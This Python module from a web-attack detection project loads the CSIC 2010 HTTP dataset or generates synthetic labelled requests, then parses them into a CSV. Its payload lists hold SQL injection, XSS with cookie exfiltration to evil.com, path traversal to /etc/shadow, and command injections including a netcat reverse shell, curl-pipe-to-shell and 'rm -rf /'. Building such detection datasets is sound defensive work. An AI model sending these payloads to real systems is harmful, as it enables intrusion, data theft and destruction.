# -*- coding: utf-8 -*-
"""
data_loader.py —— 数据读取、清洗、打标签模块（第 1 阶段）

功能概述
--------
1. 自动创建项目所需目录（data/raw、data/processed、results、notebooks）；
2. 数据获取策略（三级兜底，保证任何环境下都能跑通）：
   ① 若 data/raw 下已有数据文件（用户手动下载放置），直接使用；
   ② 否则尝试从公开镜像自动下载 CSIC 2010 数据集；
   ③ 若下载失败（无网络 / 链接失效），自动生成内置合成数据：
      正常请求 + SQL 注入 / XSS / 路径遍历 / 命令注入 四类攻击样本。
3. 将原始多行 HTTP 报文统一解析为 DataFrame，字段为：
       label        0=正常请求，1=恶意请求
       attack_type  攻击类型字符串（normal / sql_injection / xss /
                    path_traversal / command_injection / anomalous）
       method       HTTP 方法（GET/POST...）
       url          完整请求目标（路径 + 查询串）
       path         去掉查询串后的路径
       query        原始查询串（不带问号）
       headers      全部请求头拼接成的文本
       body         请求体文本（GET 请求一般为空）
4. 清洗（去重、去空 URL）后保存为 data/processed/dataset.csv；
5. main 入口打印样本，验证数据读取是否成功。

CSIC 2010 原始文件格式说明
--------------------------
数据集共 3 个文件（每个文件包含若干条完整 HTTP 报文）：
    normalTrafficTest.txt      正常请求（测试部分）  -> label = 0
    normalTrafficTrain.txt     正常请求（训练部分）  -> label = 0
    anomalousTrafficTest.txt   恶意请求（攻击流量）  -> label = 1
每条报文占多行：
    第 1 行是请求行，如：GET http://localhost:8080/tienda1/index.jsp HTTP/1.1
    随后若干行是请求头（"Header名: 值" 形式）；
    POST 请求在空行之后还有一行请求体（表单数据）。
解析时以"请求行"（GET/POST/PUT... 开头）作为一条新请求的开始标志。
"""

import re
import sys
import random
from pathlib import Path
from urllib.parse import urlsplit, quote, quote_plus

import pandas as pd

# requests 仅在自动下载时使用；即使未安装也不影响其余流程
try:
    import requests
except ImportError:
    requests = None


# ============================================================
# 路径配置（全部使用相对路径，基于本文件位置推算项目根目录）
# ============================================================
PROJECT_ROOT = Path(__file__).resolve().parents[1]   # 项目根目录
DATA_DIR = PROJECT_ROOT / "data"                     # 数据目录
RAW_DIR = DATA_DIR / "raw"                           # 原始数据（txt 报文）
PROCESSED_DIR = DATA_DIR / "processed"               # 处理后数据（dataset.csv）
RESULTS_DIR = PROJECT_ROOT / "results"               # 评估图表输出目录
NOTEBOOK_DIR = PROJECT_ROOT / "notebooks"            # 探索性分析 notebook

RANDOM_SEED = 42  # 固定随机种子，保证合成数据每次生成结果一致

# 请求行的正则：形如 "GET /xxx HTTP/1.1"（方法 + 目标 + HTTP版本）
REQUEST_LINE_RE = re.compile(
    r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+(\S+)\s+HTTP/", re.IGNORECASE
)


def ensure_dirs() -> None:
    """创建项目运行所需的全部目录（已存在则跳过）。"""
    for d in (DATA_DIR, RAW_DIR, PROCESSED_DIR, RESULTS_DIR, NOTEBOOK_DIR):
        d.mkdir(parents=True, exist_ok=True)


# ============================================================
# 一、CSIC 2010 自动下载（镜像链接可能失效，失败会自动走合成数据兜底）
# ============================================================
CSIC_MIRRORS = {
    "anomalousTrafficTest.txt": [
        "https://raw.githubusercontent.com/yungshenglu/TF-IDS-Detection/master/data/anomalousTrafficTest.txt",
        "https://cdn.jsdelivr.net/gh/yungshenglu/TF-IDS-Detection@master/data/anomalousTrafficTest.txt",
    ],
    "normalTrafficTest.txt": [
        "https://raw.githubusercontent.com/yungshenglu/TF-IDS-Detection/master/data/normalTrafficTest.txt",
        "https://cdn.jsdelivr.net/gh/yungshenglu/TF-IDS-Detection@master/data/normalTrafficTest.txt",
    ],
    "normalTrafficTrain.txt": [
        "https://raw.githubusercontent.com/yungshenglu/TF-IDS-Detection/master/data/normalTrafficTrain.txt",
        "https://cdn.jsdelivr.net/gh/yungshenglu/TF-IDS-Detection@master/data/normalTrafficTrain.txt",
    ],
}


def _download_one(filename: str, save_path: Path) -> bool:
    """
    从镜像列表中逐个尝试下载单个数据文件。

    参数:
        filename:  数据集文件名（如 anomalousTrafficTest.txt）
        save_path: 保存到本地的完整路径
    返回:
        True 表示下载成功且内容校验通过，False 表示失败。
    """
    if requests is None:
        print("  - 未安装 requests，跳过自动下载（可 pip install requests）")
        return False

    for url in CSIC_MIRRORS[filename]:
        try:
            print(f"  - 尝试下载: {url}")
            resp = requests.get(url, timeout=(5, 20),
                                headers={"User-Agent": "Mozilla/5.0"})
            # 状态码异常或内容过小 / 不含 HTTP 报文，视为无效
            if (resp.status_code != 200 or len(resp.content) < 10240
                    or b"HTTP/1." not in resp.content):
                print("    x 内容无效，换下一个镜像")
                continue
            save_path.write_bytes(resp.content)
            print(f"    √ 下载成功，共 {len(resp.content) / 1024:.0f} KB")
            return True
        except Exception as e:  # 网络 / 超时等任何异常都不中断流程
            print(f"    x 下载失败（{type(e).__name__}），换下一个镜像")
    return False


def download_csic() -> bool:
    """
    尝试自动下载 CSIC 2010 数据集的 3 个文件到 data/raw 目录。

    返回:
        True 表示 3 个文件全部下载成功；只要有 1 个失败就返回 False
        （此时调用方会改用内置合成数据，保证流程不中断）。
    """
    all_ok = True
    for filename, save_path in (
        (name, RAW_DIR / name) for name in CSIC_MIRRORS
    ):
        if save_path.exists():          # 已存在则不重复下载
            continue
        ok = _download_one(filename, save_path)
        if not ok:
            all_ok = False
            save_path.unlink(missing_ok=True)  # 删除下载不完整的残留文件
    return all_ok


# ============================================================
# 二、内置合成数据生成（离线兜底：模拟 CSIC 的电商请求场景）
# ============================================================

# ---------- 随机器与基础词表 ----------
rng = random.Random(RANDOM_SEED)  # 使用独立 Random 实例，避免污染全局随机状态

USERS = ["alice", "bob", "carol", "dave", "eve", "frank", "grace", "henry"]
PASSWORDS = ["pass123", "qwerty", "abc12345", "letmein", "dragon88", "hello2024"]
WORDS = ["summer", "sale", "new", "best", "cheap", "fast", "review", "guide", "top", "free"]
PRODUCTS = ["laptop", "phone", "book", "keyboard", "monitor", "mouse", "bag", "shoes"]

# 正常用户的浏览器 User-Agent 列表
NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",
]
# 攻击工具常见的 User-Agent（仅部分攻击样本使用，模拟真实场景）
ATTACK_UAS = ["sqlmap/1.6.7#stable", "python-requests/2.28.1", "curl/7.68.0", "Wfuzz/2.4"]

# ---------- 四类攻击的关键词载荷（payload）词表 ----------
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "1 UNION SELECT username, password FROM users --",
    "1; DROP TABLE users --",
    "1 AND SLEEP(5) --",
    "1' AND (SELECT COUNT(*) FROM users)>0 --",
    "' OR ''='",
    "admin' --",
    "1 OR 1=1 #",
    "1 WAITFOR DELAY '0:0:5' --",
    "' UNION ALL SELECT NULL, version() --",
    "1; EXEC xp_cmdshell('dir') --",
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('xss')>",
    "javascript:alert(document.cookie)",
    "<body onload=alert(1)>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<div onmouseover=\"alert(1)\">hover</div>",
    "\"><script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<a href=\"javascript:alert(1)\">click</a>",
]
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    r"..\..\..\windows\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "../../../../etc/shadow",
    "..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    r"C:\Windows\win.ini",
    "../../../../boot.ini",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
]
CMD_PAYLOADS = [
    "; cat /etc/passwd",
    "| ls -la",
    "&& dir C:\\",
    "$(whoami)",
    "`cat /etc/passwd`",
    "; ping -c 3 127.0.0.1",
    "| nc -e /bin/sh 10.0.0.1 4444",
    "& del C:\\Windows\\System32",
    "; rm -rf /",
    "| type C:\\boot.ini",
    "; shutdown -h now",
    "$(curl http://evil.sh | sh)",
]

# 攻击类型 -> 对应载荷词表
ATTACK_PAYLOADS = {
    "sql_injection": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "path_traversal": TRAVERSAL_PAYLOADS,
    "command_injection": CMD_PAYLOADS,
}

# 正常 GET 页面及其查询参数（值为小函数，每条样本随机取值）
NORMAL_GET_TEMPLATES = [
    ("/index.html", {}),
    ("/tienda1/index.jsp", {}),
    ("/tienda1/publico/registro.jsp", {}),
    ("/tienda1/publico/caracteristicas.jsp", {"id": lambda: rng.randint(1, 500)}),
    ("/tienda1/publico/articulo.jsp",
     {"id": lambda: rng.randint(1, 500), "tipo": lambda: rng.choice(["A", "B", "C"])}),
    ("/tienda1/publico/buscar.jsp", {"texto": lambda: rng.choice(WORDS)}),
    ("/tienda1/publico/pagar.jsp",
     {"precio": lambda: f"{rng.uniform(1, 500):.2f}",
      "moneda": lambda: rng.choice(["EUR", "USD"])}),
    ("/tienda1/publico/listado.jsp", {"pagina": lambda: rng.randint(1, 20)}),
    ("/static/js/main.js", {}),
    ("/static/css/style.css", {}),
    ("/images/logo.png", {}),
    ("/favicon.ico", {}),
]

# 攻击样本注入时常用的目标页面（看起来和正常页面一样，只是参数被污染）
ATTACK_TARGET_PATHS = [
    "/tienda1/publico/articulo.jsp",
    "/tienda1/publico/buscar.jsp",
    "/tienda1/publico/caracteristicas.jsp",
    "/tienda1/publico/listado.jsp",
    "/index.html",
    "/tienda1/anadir.jsp",
]

# 注入参数名（攻击者常把载荷塞进这些常见参数里）
INJECT_PARAMS = ["id", "q", "texto", "search", "file", "page", "name", "categoria", "usuario", "cmd"]


def _build_query(params: dict) -> str:
    """把参数字典拼成查询串（k1=v1&k2=v2），值保持原样不再编码。"""
    return "&".join(f"{k}={v}" for k, v in params.items())


def _make_headers(method: str, body: str = "", attacker: bool = False) -> list:
    """
    生成随机请求头列表。

    参数:
        method:   HTTP 方法，POST 时会补充 Content-Type / Content-Length
        body:     请求体（用于计算 Content-Length）
        attacker: True 时有 25% 概率使用攻击工具的 User-Agent
    """
    ua = rng.choice(ATTACK_UAS) if (attacker and rng.random() < 0.25) else rng.choice(NORMAL_UAS)
    headers = [
        "Host: localhost:8080",
        f"User-Agent: {ua}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9",
        "Connection: keep-alive",
    ]
    if method == "POST":
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {len(body)}")
    return headers


def _format_request(method: str, target: str, headers: list, body: str = "") -> str:
    """把请求行、请求头、请求体拼成一条 CSIC 风格的多行报文文本。"""
    lines = [f"{method} {target} HTTP/1.1"] + headers + [""]
    if method == "POST" and body:
        lines.append(body)
    return "\n".join(lines) + "\n\n"


def _make_normal_request() -> str:
    """随机生成一条正常请求报文（GET 浏览 / POST 登录注册 / 购物车）。"""
    if rng.random() < 0.6:  # 60% 概率生成 GET 请求
        path, param_fns = rng.choice(NORMAL_GET_TEMPLATES)
        params = {k: fn() for k, fn in param_fns.items()}
        # 随机附加额外参数，提高样本多样性、降低去重后的样本损失
        if rng.random() < 0.6:
            params["lang"] = rng.choice(["es", "en", "fr", "de"])
        if rng.random() < 0.4:
            params["ref"] = rng.choice(WORDS)
        qs = _build_query(params)
        target = f"{path}?{qs}" if qs else path
        return _format_request("GET", target, _make_headers("GET"))
    # 以下为 POST 请求：登录 / 注册 / 更新购物车
    r = rng.random()
    if r < 0.4:  # 登录
        path = "/tienda1/publico/autenticar.jsp"
        body = f"usr_login={rng.choice(USERS)}&usr_passwd={rng.choice(PASSWORDS)}"
        if rng.random() < 0.5:  # 随机附加字段，提高样本多样性
            body += f"&remember={rng.choice(['1', '0', 'true', 'false'])}"
        if rng.random() < 0.3:
            body += f"&redirect={rng.choice(NORMAL_GET_TEMPLATES)[0].strip('/')}"
    elif r < 0.75:  # 注册
        path = "/tienda1/publico/registro.jsp"
        body = (f"nombre={rng.choice(USERS).capitalize()}"
                f"&apellidos=Smith"
                f"&domicilio=Calle+Mayor+{rng.randint(1, 99)}"
                f"&ciudad=Madrid"
                f"&cod_postal={rng.randint(10000, 99999)}"
                f"&telefono=6{rng.randint(10000000, 99999999)}"
                f"&email=user{rng.randint(1, 999)}@mail.com")
    else:  # 更新购物车
        path = "/tienda1/anadir.jsp"
        body = (f"id_articulo={rng.randint(1, 500)}"
                f"&producto={rng.choice(PRODUCTS)}"
                f"&cantidad={rng.randint(1, 5)}")
    return _format_request("POST", path, _make_headers("POST", body), body)


def _make_attack_request(attack_type: str) -> str:
    """
    随机生成一条攻击请求报文。

    策略：随机挑一个正常目标页面，把攻击载荷注入到
    ① URL 查询参数（URL 值做 URL 编码）；或
    ② URL 路径本身（路径遍历常见，保留 / 和 \\ 不编码）；或
    ③ POST 请求体（表单值做表单编码）。
    """
    payload = rng.choice(ATTACK_PAYLOADS[attack_type])
    method = "GET" if rng.random() < 0.6 else "POST"
    body = ""

    if method == "GET":
        path = rng.choice(ATTACK_TARGET_PATHS)
        if attack_type == "path_traversal" and rng.random() < 0.5:
            # 直接把载荷注入 URL 路径（../ 保留原样，空格等转 %20）
            target = path.rstrip("/") + "/" + quote(payload, safe="/\\%._-")
        else:
            # 注入到查询参数（safe="" 使 / 和空格都被编码）
            params = {rng.choice(INJECT_PARAMS): quote(payload, safe="")}
            if rng.random() < 0.5:  # 一半概率附加正常参数，增加识别难度
                # 注意：参数名不能与注入参数重名，否则字典会覆盖掉攻击载荷
                params["offset"] = rng.randint(1, 10)
            target = f"{path}?{_build_query(params)}"
    else:  # POST：载荷注入表单字段
        path = rng.choice(["/tienda1/publico/autenticar.jsp",
                           "/tienda1/publico/registro.jsp",
                           "/tienda1/publico/buscar.jsp"])
        params = {rng.choice(INJECT_PARAMS): quote_plus(payload)}
        if rng.random() < 0.6:  # 混入正常登录字段，让恶意样本更像真实流量
            params["usr_login"] = rng.choice(USERS)
            params["usr_passwd"] = rng.choice(PASSWORDS)
        body = _build_query(params)
        target = path

    return _format_request(method, target, _make_headers(method, body, attacker=True), body)


def generate_synthetic_files(n_normal: int = 400, n_per_attack: int = 120) -> None:
    """
    生成内置合成数据并写入 data/raw 目录（CSIC 同款多行报文格式）。

    生成 5 个文件：
        synthetic_normal.txt             正常请求（label=0）
        synthetic_sql_injection.txt      SQL 注入（label=1）
        synthetic_xss.txt                XSS（label=1）
        synthetic_path_traversal.txt     路径遍历（label=1）
        synthetic_command_injection.txt  命令注入（label=1）

    参数:
        n_normal:     正常样本数量
        n_per_attack: 每类攻击的样本数量
    """
    files = {
        "synthetic_normal.txt": [_make_normal_request() for _ in range(n_normal)],
    }
    for attack_type in ATTACK_PAYLOADS:
        files[f"synthetic_{attack_type}.txt"] = [
            _make_attack_request(attack_type) for _ in range(n_per_attack)
        ]
    for filename, texts in files.items():
        (RAW_DIR / filename).write_text("".join(texts), encoding="utf-8")
    print(f"  √ 合成数据已生成到 {RAW_DIR}（正常 {n_normal} 条，"
          f"每类攻击 {n_per_attack} 条，共 {n_normal + n_per_attack * 4} 条）")


# ============================================================
# 三、原始报文解析 -> DataFrame
# ============================================================

def discover_raw_files() -> list:
    """
    扫描 data/raw 目录，识别可用的原始数据文件。

    文件名规则（不区分大小写）：
        synthetic_ 开头    -> 合成数据，后缀即攻击类型（normal 则 label=0）
        含 anomal/attack/malicious -> 恶意请求（label=1, attack_type=anomalous）
        含 normal          -> 正常请求（label=0, attack_type=normal）

    返回:
        [(文件路径, label, attack_type), ...] 列表
    """
    result = []
    for p in sorted(RAW_DIR.glob("*.txt")):
        name = p.stem.lower()
        if name.startswith("synthetic_"):
            attack_type = name.replace("synthetic_", "")
            result.append((p, 0 if attack_type == "normal" else 1, attack_type))
        elif any(k in name for k in ("anomal", "attack", "malicious")):
            result.append((p, 1, "anomalous"))
        elif "normal" in name:
            result.append((p, 0, "normal"))
        # 其余文件名无法识别用途，跳过
    return result


def parse_request_file(path: Path, label: int, attack_type: str) -> list:
    """
    解析一个 CSIC 风格的多行报文文件为结构化记录列表。

    参数:
        path:        文件路径
        label:       0=正常 / 1=恶意（按文件来源人工指定）
        attack_type: 攻击类型字符串
    返回:
        [dict, ...]，每个 dict 是一条请求的结构化字段
    """
    # 兼容不同编码：优先 utf-8，遇到非法字节用替代符，避免解析中断
    text = path.read_text(encoding="utf-8", errors="replace")
    lines = text.splitlines()

    records, cur = [], None       # cur 为当前正在解析的请求
    in_body = False               # 是否已进入请求体部分（空行之后）
    for line in lines:
        m = REQUEST_LINE_RE.match(line.strip())
        if m:  # 命中请求行 => 上一条请求结束，开始新请求
            if cur is not None:
                records.append(cur)
            cur = {"method": m.group(1).upper(), "target": m.group(2),
                   "headers": [], "body": []}
            in_body = False
        elif cur is not None:
            if line.strip() == "":          # 空行 => 之后的行是请求体
                in_body = True
            elif in_body:                   # 请求体（一般 1 行表单数据）
                cur["body"].append(line.strip())
            else:                           # 请求头
                cur["headers"].append(line.strip())
    if cur is not None:
        records.append(cur)                 # 别忘了最后一条

    # 拆分 target 为 path 与 query；统一为 dict 记录
    parsed = []
    for r in records:
        split = urlsplit(r["target"])
        parsed.append({
            "label": label,
            "attack_type": attack_type,
            "method": r["method"],
            "url": r["target"],
            "path": split.path or "/",
            "query": split.query,
            "headers": "\n".join(r["headers"]),
            "body": " ".join(r["body"]),
        })
    return parsed


def build_dataset(save: bool = True) -> pd.DataFrame:
    """
    解析 data/raw 下全部数据文件，清洗后构建统一数据集。

    清洗步骤：
        1) 丢弃 URL 为空的记录（解析异常数据）；
        2) 按 (method, url, body, label) 去重（原始数据存在大量重复报文）。

    参数:
        save: True 时保存到 data/processed/dataset.csv
    返回:
        清洗后的 DataFrame
    """
    files = discover_raw_files()
    if not files:
        raise FileNotFoundError(
            f"data/raw 下没有可识别的数据文件，请先运行下载或合成数据。")

    frames = []
    print("[2/3] 解析原始报文文件:")
    for path, label, attack_type in files:
        recs = parse_request_file(path, label, attack_type)
        print(f"  - {path.name}: {len(recs)} 条请求 (label={label}, type={attack_type})")
        frames.append(pd.DataFrame(recs))

    df = pd.concat(frames, ignore_index=True)
    df = df[df["url"].str.len() > 0]                                   # 去空
    df = df.drop_duplicates(subset=["method", "url", "body", "label"])  # 去重
    df = df.reset_index(drop=True)

    if save:
        save_path = PROCESSED_DIR / "dataset.csv"
        # utf-8-sig 编码保证用 Excel 打开中文不乱码
        df.to_csv(save_path, index=False, encoding="utf-8-sig")
        print(f"  √ 数据集已保存: {save_path}")
    return df


def load_dataset(rebuild: bool = False) -> pd.DataFrame:
    """
    获取数据集：优先读取已处理的 CSV，不存在或 rebuild=True 时重新构建。

    参数:
        rebuild: True 强制重新解析原始文件
    返回:
        DataFrame（字段见模块 docstring）
    """
    csv_path = PROCESSED_DIR / "dataset.csv"
    if csv_path.exists() and not rebuild:
        return pd.read_csv(csv_path, encoding="utf-8-sig").fillna("")
    return build_dataset(save=True)


# ============================================================
# 四、命令行入口：跑通"获取数据 -> 解析 -> 打印样本"
# ============================================================
def _shorten(text: str, width: int = 90) -> str:
    """打印用辅助函数：截断过长文本并去掉换行，避免刷屏。"""
    text = str(text).replace("\n", " | ")
    return text if len(text) <= width else text[:width] + "..."


def main() -> None:
    """第 1 阶段验证入口：准备数据、构建数据集、打印样本和统计信息。"""
    ensure_dirs()
    print("=" * 70)
    print("第 1 步：准备原始数据")
    print("=" * 70)

    files = discover_raw_files()
    if files:
        print("检测到已有原始数据文件：")
        for p, _, _ in files:
            print(f"  - {p.name}")
    else:
        print("data/raw 目录为空，开始获取数据...")
        if download_csic():
            print("  √ CSIC 2010 数据集下载完成！")
        else:
            print("  ! 自动下载失败（可能无网络或镜像失效），改用内置合成数据兜底。")
            generate_synthetic_files()

    df = load_dataset(rebuild=not files)  # 数据没变化时直接读缓存 CSV

    # ---------- 打印数据集概况 ----------
    print()
    print("=" * 70)
    print("第 2 步：数据集概况")
    print("=" * 70)
    print(f"总样本数: {len(df)}")
    print("\n标签分布:")
    print(df["label"].value_counts().rename({0: "正常(0)", 1: "恶意(1)"}).to_string())
    print("\n攻击类型分布:")
    print(df["attack_type"].value_counts().to_string())
    print("\nHTTP 方法分布:")
    print(df["method"].value_counts().to_string())

    # ---------- 打印样本 ----------
    print()
    print("=" * 70)
    print("第 3 步：样本预览（每类取 2 条）")
    print("=" * 70)
    for atype in df["attack_type"].unique():
        sub = df[df["attack_type"] == atype].head(2)
        for _, row in sub.iterrows():
            print(f"\n--- [{atype}] label={row['label']} ---")
            print(f"  方法  : {row['method']}")
            print(f"  URL   : {_shorten(row['url'])}")
            if str(row["query"]):
                print(f"  Query : {_shorten(row['query'])}")
            if str(row["body"]):
                print(f"  Body  : {_shorten(row['body'])}")

    print("\n√ 第 1 阶段完成：数据读取与打标签流程跑通！")


if __name__ == "__main__":
    # Windows 控制台强制 UTF-8 输出，避免中文乱码
    if sys.platform == "win32":
        try:
            sys.stdout.reconfigure(encoding="utf-8")
        except Exception:
            pass
    main()
